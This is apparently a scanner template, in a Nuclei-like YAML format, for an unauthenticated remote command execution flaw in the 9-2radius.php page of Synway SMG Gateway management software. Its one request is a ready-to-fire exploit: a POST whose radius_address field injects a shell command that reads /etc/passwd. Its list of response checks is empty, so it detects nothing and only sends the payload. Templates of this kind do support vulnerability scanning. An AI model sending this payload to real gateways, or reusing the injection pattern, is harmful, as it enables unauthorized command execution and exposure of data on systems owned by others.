id: sanhuismg-radius-rce
brief:
    title: Synway SMG Gateway 9-2radius.php - Remote Command Execution
    by: Chenkh
    level: critical
    about: Synway SMG Gateway Management Software contains a remote command execution vulnerability in 9-2radius.php, where the radius_address parameter is passed to a system() call without sanitization. This...
    label:
        - rce
        - synway
        - gateway
        - unauth
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/en/9-2radius.php?authority=6'
      head:
        Accept-Encoding: gzip
        Content-Type: application/x-www-form-urlencoded
      body: save=1&enable_radius=1&radius_address=/';cat /etc/passwd;+#
      signs: []
